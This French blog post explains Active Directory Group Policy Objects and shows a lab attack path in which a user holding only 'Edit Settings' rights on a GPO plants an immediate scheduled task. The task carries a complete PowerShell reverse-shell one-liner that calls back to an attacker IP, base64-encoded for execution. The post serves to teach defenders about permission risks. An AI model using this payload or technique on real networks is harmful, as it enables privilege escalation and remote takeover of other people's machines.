---
title: "GPO - Chemin d'attaque"
date: 2019-04-12 11:28:42
author: "Pixis"
layout: post
permalink: /gpo-abuse-with-edit-settings/
disqus_identifier: 0000-0000-0000-00ae
cover: assets/uploads/2019/04/gpo_banner.png
description: "Cet article présente ce qu'est une GPO puis décrit un chemin d'attaque possible lorsqu'un attaquant a le droit de modifier les paramètres d'une GPO qui s'applique à des utilisateurs."
tags:
  - "Active Directory"
  - Windows
---

Cet article présente ce qu'est une GPO (Group Policy Object) puis décrit un chemin d'attaque possible lorsqu'un attaquant a le droit de modifier les paramètres d'une GPO qui s'applique à des utilisateurs.

<!--more-->

## Group Policy Object

### Définition

Parmi les différents rôles d'un Active Directory se trouve le rôle de gestion du parc. Active Directory permet de gérer l'ensemble des machines et utilisateurs du système d'information, et pour cela les "stratégies de groupe" (Group Policy Objects - GPO) sont un outil indispensable.

Concrètement, les GPO sont un ensemble de règles/actions qui s'appliquent à un ensemble bien défini d'objets. Une GPO permet de faire beaucoup, beaucoup de choses. 

[![Example GPO](/assets/uploads/2019/04/example_gpo.png)](/assets/uploads/2019/04/example_gpo.png)

Comme on le voit sur cette capture d'écran, il est possible de créer/modifier des scripts au démarrage et à l'arrêt d'une machine, de changer les paramètres du pare-feu, de créer des tâches planifiées, ou même d'ajouter des utilisateurs au groupe local d'administration. Ce ne sont que des exemples parmi tant d'autres pour montrer à quel point les fonctionnalités imposables via GPO sont diverses et puissantes.

### Composition

Une GPO est composée de deux éléments :

* Un conteneur (Group Policy Container - GPC), qui est l'objet enregistré dans l'Active Directory, sous le groupe `adsec.local > system > policies`. Chaque GPO est identifiée par un identifiant unique dans le domaine.

[![GPC](/assets/uploads/2019/04/gpc.png)](/assets/uploads/2019/04/gpc.png)

C'est ici que sont gérés finement les droits de création/modification des GPO, comme tout objet de l'Active Directory. 


* Les fichiers qui contiennent les informations à appliquer sur les machines ou les utilisateurs. Ces fichiers sont présents sur chaque contrôleur de domaine, dans le partage réseau `\\dc-01.adsec.local\SYSVOL\adsec.local\Policies\`, et sont organisés dans des dossiers : Un dossier par GPO, le nom du dossier étant l'identifiant unique correspondant au conteneur GPC.

[![GPO files](/assets/uploads/2019/04/gpo_files.png)](/assets/uploads/2019/04/gpo_files.png)

C'est grâce à l'exposition de ces fichiers aux comptes de domaine que ces derniers peuvent mettre à jour leurs GPO.

## Contexte de recherche

Dans ma croisade en plein Active Directory, j'utilise de manière très intense l'outil [Bloodhound](https://github.com/BloodHoundAD/BloodHound) développé par [@wald0](https://twitter.com/_wald0), [@Harmj0y](https://twitter.com/harmj0y) et [@CptJesus](https://twitter.com/cptjesus), que je ne remercierai jamais assez pour leur travail et leur disponibilité sur leur slack [BloodHoundHQ](https://bloodhoundgang.herokuapp.com/). 

Après avoir regardé la [prise de parole](https://www.youtube.com/watch?v=0r8FzbOg2YU&list=PL1eoQr97VfJnvOWo_Jxk2qUrFyB-BJh4Y&index=4&t=0s) de [@wald0](https://twitter.com/_wald0) et [@CptJesus](https://twitter.com/cptjesus) à la conférence [WeAreTroopers](https://www.troopers.de/), j'ai commencé à me pencher sur les chemins d'attaque impliquant les GPO. Bloodhound aide énormément sur ce sujet, et propose notamment un chemin d'attaque lorsqu'un compte du domaine a les droits `WriteDacl` sur une GPO. 

[![BloodHound Path](/assets/uploads/2019/04/bh_path.png)](/assets/uploads/2019/04/bh_path.png)

Sur ce schéma, on voit un utilisateur avec un crâne, correspondant à un compte compromis. Ce compte fait partie d'un groupe qui possède les droits `WriteDacl` sur une GPO. Cette GPO s'applique enfin à une unité d'organisation (OU) contenant notamment l'utilisateur en bas à droite, cible de l'attaque.

Ce droit `WriteDacl` permet aux membres du groupe de modifier les ACL (Access Control List) de la GPO concernée, c'est à dire les droits d'accès à la GPO, notamment la modification du propriétaire de l'objet. Ainsi, un utilisateur du groupe possédant ce droit peut s'auto-proclamer propriétaire, pour ensuite la modifier arbitrairement.

Par défaut, lorsqu'une GPO est créée, peu de personnes ont le droit de la modifier. Les utilisateurs peuvent la lire (obligatoire pour pouvoir l'appliquer !), mais seuls les groupes "Domain Admins" et "Enterprise Admins" ont les droits absolus dessus, c'est à dire qu'ils peuvent la modifier (Edit Settings), la supprimer (Delete), et modifier les droits d'accès (Modify Security).

[![ACL GPO](/assets/uploads/2019/04/ACL_GPO.png)](/assets/uploads/2019/04/ACL_GPO.png)


Si un administrateur souhaite déléguer ces permissions à un utilisateur sans pour autant l'ajouter à l'un des deux groupes, c'est tout à fait possible via cet onglet de délégation. C'est un endroit simplifiant la gestion des droits sur une GPO. En effet, il est tout à fait possible de modifier les droits directement au niveau de la GPC, mais c'est beaucoup plus complexe.

[![GPC Rights](/assets/uploads/2019/04/GPC_rights.png)](/assets/uploads/2019/04/GPC_rights.png)

On voit que la barre de défilement permet de lister un grand, très grand nombre de paramètres d'accès.

Il est donc plus aisé de passer par l'interface de gestion des GPO pour ajouter un utilisateur afin de lui déléguer des droits :

[![Add User ACL Gpo](/assets/uploads/2019/04/add_user_acl_gpo.png)](/assets/uploads/2019/04/add_user_acl_gpo.png)

Puis on indique les droits qu'on lui concède :

[![Edit settings user](/assets/uploads/2019/04/edit_settings_add_user.png)](/assets/uploads/2019/04/edit_settings_add_user.png)

Trois choix sont proposés, choix qui sont une préselection facilitant la vie des administrateurs, en modifiant des droits bien précis au niveau de la GPC.

[![Edit settings added for user](/assets/uploads/2019/04/settings_added.png)](/assets/uploads/2019/04/settings_added.png)

Maintenant cet utilisateur fait partie des personnes/groupes à avoir les droits ultimes sur cette GPO. C'est ce contrôle total que l'on voit apparaitre dans BloodHound lorsqu'une entité a un lien "WriteDacl" vers une GPO. En effet, cette présélection ajoute les paramètres de sécurité "Modify Owner" et "Modify Permissions".

[![Write DACL](/assets/uploads/2019/04/writedacl.png)](/assets/uploads/2019/04/writedacl.png)



## Droit "Edit Settings"

On a vu au-dessus qu'il y avait trois niveaux de délégation :

* Read
* Edit Settings
* Edit Settings, delete, modify security

Le troisième niveau est pris en charge dans la collecte BloodHound. Cependant, que se passe-t-il si un utilisateur ne possède que le droit de modifier la GPO, mais pas les ACL associées ? C'est la question que je me suis posé. 

Pour y répondre, j'ai créé une GPO d'exemple, appelée "TestGPO Abuse", s'appliquant à l'ensemble des utilisateurs appartenant à l'OU "Domain Users". Comme dans l'exemple précédant, j'ai ajouté l'utilisateur "jdoe" dans la délégation de la gestion de cette GPO, en indiquant qu'il ne pouvait que modifier les paramètres de cette GPO, mais pas les ACL associées ("Edit Settings").

[![Edit Settings for jdoe](/assets/uploads/2019/04/edit_settings_jdoe.png)](/assets/uploads/2019/04/edit_settings_jdoe.png)

## GPO appliquée à des utilisateurs

Dans ma recherche, je souhaitais également savoir ce que je pouvais faire lorsque la GPO ne s'appliquait qu'à des utilisateurs, pas à des machines. C'est pourquoi "TestGPO Abuse" ne s'applique qu'à l'OU "Domain Users". En effet, tous les paramètres contrôlables dans la partie "Computer Configuration" de la GPO ne s'appliqueront pas si cette GPO est destinée à des utilisateurs. Seuls ceux dans "User Configuration" le seront.

[![No Computer GPO](/assets/uploads/2019/04/no_computer_gpo.png)](/assets/uploads/2019/04/no_computer_gpo.png)

Mais concrètement, qu'est-ce qui est disponible dans les paramètres de GPO appliqués à un utilisateur ? Et bien beaucoup moins de choses, mais des paramètres intéressants tout de même !

[![User Example GPO](/assets/uploads/2019/04/user_gpo_example.png)](/assets/uploads/2019/04/user_gpo_example.png)

On voit qu'on peut installer des paquets, gérer encore une fois les scripts au login/logout, éditer des groupes et utilisateurs locaux et les tâches planifiées.

## Exploitation via une tâche planifiée immédiate

Nous allons nous intéresser plus particulièrement aux tâches planifiées. Il est possible de créer des tâches planifiées qui s'exécuteront immédiatement, lorsque la GPO sera appliquée à l'utilisateur.

Ainsi, si nous nous connectons en tant que l'utilisateur `jdoe` sur une machine, nous pouvons créer cette tâche.

[![Abuse Task](/assets/uploads/2019/04/abusetask.png)](/assets/uploads/2019/04/abusetask.png)

Elle est créée en tant que l'utilisateur `jdoe`, et lorsqu'elle sera appliquée, ce sera en tant que l'utilisateur à qui elle s'applique.

Dans l'onglet "Actions", nous indiquons ce qu'il se passera à l'exécution. Ici, nous utilisons un reverse-shell en Powershell pour que lors de son exécution, l'utilisateur cible se connecte à l'attaquant en proposant un shell.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.0.20.12",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Ce code est transormé en base 64 pour le passer à la commande `powershell -enc <base 64 de la commande>`.

[![Abuse Task Powershell](/assets/uploads/2019/04/abusetask_pwsh.png)](/assets/uploads/2019/04/abusetask_pwsh.png)

Une fois cette tâche créée, lors de la mise à jour des GPO sur un client, par exempe sur le compte `support-account`, elle sera exécutée sur la machine, et l'attaquant récupère un shell.

[![Reverse Shell Worked](/assets/uploads/2019/04/re_shell_worked.png)](/assets/uploads/2019/04/re_shell_worked.png)

## Conclusion

L'idée de cet article est de montrer que les GPO sont un pilier dans l'organisation d'un Active Directory, et doivent être maitrisées tout autant que beaucoup d'autres objets. Une permission mal placée peut permettre à un attaquant d'en abuser et d'élever ses privilèges dans le système d'information.

Ici, l'exemple de la tâche planifiée a été utilisé sur une GPO appliquée à des utilisateurs, cependant il existe un grand nombre de possibilités ouvertes par les GPO qui peuvent être utilisées pour exécuter du code. 